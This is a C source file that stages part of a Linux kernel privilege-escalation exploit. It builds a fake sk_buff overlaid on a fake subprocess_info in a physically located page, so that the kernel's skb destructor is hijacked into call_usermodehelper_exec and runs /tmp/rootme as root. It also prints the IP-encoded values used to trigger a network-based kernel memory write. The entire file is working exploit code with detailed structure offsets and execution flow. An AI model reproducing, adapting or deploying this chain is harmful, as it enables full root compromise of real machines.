/* rce_prep.c - stage the fake skb == subprocess_info for the full-root chain.
 *
 * Maps one page, reads its PFN from /proc/self/pagemap (needs root), and
 * fills it with a fake struct sk_buff overlaid on a fake struct
 * subprocess_info (subprocess_info is __randomize_layout but this kernel's
 * BTF shows source order; size exactly 96 == skb.destructor offset):
 *
 *   S = P + 0x10 : subprocess_info (fake skb)
 *     S+0    work.data = 0            (doubles as list-walk next=NULL)
 *     S+24   work.func = call_usermodehelper_exec_work
 *     S+40   path  = P+0x400          ("/tmp/rootme")
 *     S+48   argv  = P+0x480          ([path, NULL])
 *     S+56   envp  = P+0x500          ([HOME, PATH, NULL])
 *     S+72   init  = NULL   S+80 cleanup = NULL   S+88 data = 0
 *     S+96   destructor = call_usermodehelper_exec   <-- the hijacked call
 *     S+104  _nfct = 0        S+128 _skb_refdst = 0
 *     S+126  cloned=1, fclone=SKB_FCLONE_ORIG(1) -> 0x05
 *     S+192  end = 0x100      S+200 head = P+0x100   S+220 users = 1
 *     S+224  extensions = 0
 *     S+464  fclones.fclone_ref = 5   (ORIG: kfree_skbmem returns, NO free)
 *     P+0x200 shinfo: zeros, dataref@+32 = 2 (cloned+dataref: no data frees)
 *
 * Flow when the frag_list walk frees the fake skb (task context, in the
 * reader's recvfrom):
 *   kfree_skb_reason -> __kfree_skb -> skb_release_all ->
 *   skb_release_head_state -> skb->destructor(skb)
 *     = call_usermodehelper_exec(sub_info, garbage_wait)
 *       -> queue_work(system_unbound_wq, &sub_info->work)   [kworker = root]
 *       -> kworker: call_usermodehelper_exec_work(&work)
 *          -> user_mode_thread(call_usermodehelper_exec_async, CLONE_PARENT)
 *             -> prepare_kernel_cred(kworker) = root creds, commit_creds,
 *                kernel_execve("/tmp/rootme", argv, envp)  ==> ROOT BINARY
 *       -> (garbage wait == 0: caller returns instantly; kfree(S) WARN later
 *          from the kworker. garbage wait != 0: caller blocks until the
 *          helper execs, then freeinfo -> kfree(S) WARN. Survivable either
 *          way; the binary already runs as root.)
 *   skb_release_data: cloned=1 && dataref 2->1 -> goto exit (no data frees)
 *   kfree_skbmem: fclone=ORIG, fclone_ref 5->4 -> return (no skb free)
 *   walk: segs = segs->next = work.data = 0 -> walk ends. VM stays clean.
 *
 * Prints S, X (frag_list low32 as IP) and Y (high32 as IP) for the caller.
 *
 * Usage: rce_prep <page_offset_base> <call_usermodehelper_exec> \
 *                 <call_usermodehelper_exec_work>
 */
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define PAGE_OFFSET_BASE 0xffff888000000000UL   /* overridden by argv[1] */

int main(int argc, char **argv) {
    unsigned long POB = PAGE_OFFSET_BASE;
    if (argc > 1 && argv[1][0])
        POB = strtoul(argv[1], NULL, 16);
    if (argc < 4) {
        fprintf(stderr,
                "usage: %s <page_offset_base> <call_usermodehelper_exec> "
                "<call_usermodehelper_exec_work>\n", argv[0]);
        return 1;
    }
    unsigned long UMH_EXEC = strtoul(argv[2], NULL, 16);
    unsigned long UMH_WORK = strtoul(argv[3], NULL, 16);
    if (!UMH_EXEC || !UMH_WORK) {
        fprintf(stderr, "bad umh addresses\n");
        return 1;
    }

    /* allocate many pages and pick one (physmap covers all RAM) */
    size_t npg = 24576, pg = 4096;   /* 96MB */
    char *base = mmap(NULL, npg * pg, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED) { perror("mmap"); return 1; }
    for (size_t i = 0; i < npg; i++)
        *(volatile char *)(base + i * pg) = 1;   /* fault every page in */
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0) { perror("pagemap (run as root)"); return 1; }
    size_t pick = (size_t)-1;
    unsigned long pfn = 0;
    for (size_t i = 0; i < npg; i++) {
        unsigned long e = 0;
        if (pread(fd, &e, 8, ((unsigned long)(base + i * pg) >> 12) * 8) != 8)
            continue;
        if (i < 3) fprintf(stderr, "[dbg] page %zu entry %lx\n", i, e);
        if (!(e & (1UL << 63))) continue;
        unsigned long f = e & ((1UL << 55) - 1);
        if (f) { pick = i; pfn = f; break; }
    }
    close(fd);
    if (pick == (size_t)-1) { fprintf(stderr, "no page found\n"); return 1; }
    char *m = base + pick * pg;
    memset(m, 0, pg);
    unsigned long paddr = pfn << 12;
    unsigned long P = POB + paddr;
    unsigned long S = P + 0x10;
    size_t soff = 0x10;                 /* page offset of the fake skb */
    unsigned long *w;

    printf("PFN %lu paddr 0x%lx P 0x%lx S 0x%lx\n", pfn, paddr, P, S);

    /* ---- subprocess_info (S+0 .. S+95), BTF-verified offsets ---- */
    *(unsigned long *)(m + soff + 0)   = 0;          /* work.data / next */
    *(unsigned long *)(m + soff + 8)   = S + 8;      /* work.entry.next (self) */
    *(unsigned long *)(m + soff + 16)  = S + 8;      /* work.entry.prev (self) */
    *(unsigned long *)(m + soff + 24)  = UMH_WORK;   /* work.func */
    *(unsigned long *)(m + soff + 32)  = 0;          /* complete */
    *(unsigned long *)(m + soff + 40)  = P + 0x400;  /* path */
    *(unsigned long *)(m + soff + 48)  = P + 0x480;  /* argv */
    *(unsigned long *)(m + soff + 56)  = P + 0x500;  /* envp */
    *(unsigned int  *)(m + soff + 64)  = 0;          /* wait (overwritten) */
    *(unsigned int  *)(m + soff + 68)  = 0;          /* retval */
    *(unsigned long *)(m + soff + 72)  = 0;          /* init */
    *(unsigned long *)(m + soff + 80)  = 0;          /* cleanup */
    *(unsigned long *)(m + soff + 88)  = 0;          /* data */

    /* ---- fake sk_buff fields (offsets verified on boots A/C) ---- */
    w = (unsigned long *)(m + soff + 96);    *w = UMH_EXEC; /* destructor */
    w = (unsigned long *)(m + soff + 104);   *w = 0;        /* _nfct */
    m[soff + 126] = 0x05;                        /* cloned=1, fclone=ORIG */
    w = (unsigned long *)(m + soff + 128);   *w = 0;        /* _skb_refdst */
    *(unsigned int *)(m + soff + 192) = 0x100;              /* end */
    w = (unsigned long *)(m + soff + 200);   *w = P + 0x100;/* head */
    *(unsigned int *)(m + soff + 220) = 1;                  /* users */
    w = (unsigned long *)(m + soff + 224);   *w = 0;        /* extensions */
    /* sk_buff_fclones: skb1@0 skb2@232 fclone_ref@464 (BTF) */
    *(unsigned int *)(m + soff + 464) = 5;                  /* fclone_ref */

    /* fake shinfo at page+0x200 (head P+0x100 + end 0x100) */
    memset(m + 0x200, 0, 0x140);
    *(unsigned int *)(m + 0x200 + 32) = 2;    /* dataref: cloned dodge */

    /* ---- umh payload strings / vectors ---- */
    strcpy(m + 0x400, "/tmp/rootme");
    w = (unsigned long *)(m + 0x480);
    w[0] = P + 0x400; w[1] = 0;                          /* argv */
    w = (unsigned long *)(m + 0x500);
    w[0] = P + 0x540; w[1] = P + 0x548; w[2] = 0;        /* envp */
    strcpy(m + 0x540, "HOME=/");
    strcpy(m + 0x548, "PATH=/sbin:/bin:/usr/sbin:/usr/bin");

    /* ---- the write values ---- */
    unsigned long fl = S;                    /* frag_list value */
    unsigned char lo[4], hi[4];
    for (int i = 0; i < 4; i++) {
        lo[i] = (fl >> (8 * i)) & 0xff;      /* memory bytes at shinfo+8..11 */
        hi[i] = (fl >> (32 + 8 * i)) & 0xff; /* memory bytes at shinfo+12..15 */
    }
    printf("X (srr write value, storm SYN src IP)  = %u.%u.%u.%u\n", lo[0], lo[1], lo[2], lo[3]);
    printf("Y (rr  write value, route src IP)      = %u.%u.%u.%u\n", hi[0], hi[1], hi[2], hi[3]);
    printf("ISN (client) = 0x%x  (ack bytes 68,70,71 = 109,113,100)\n", 0x6D507163u);
    printf("umh: destructor=%lx work.func=%lx path=%s\n", UMH_EXEC, UMH_WORK, m + 0x400);
    printf("keep this process alive to keep the page mapped; sleeping\n");
    fflush(stdout);
    /* keep the page mapped and untouched forever */
    for (;;) pause();
    return 0;
}
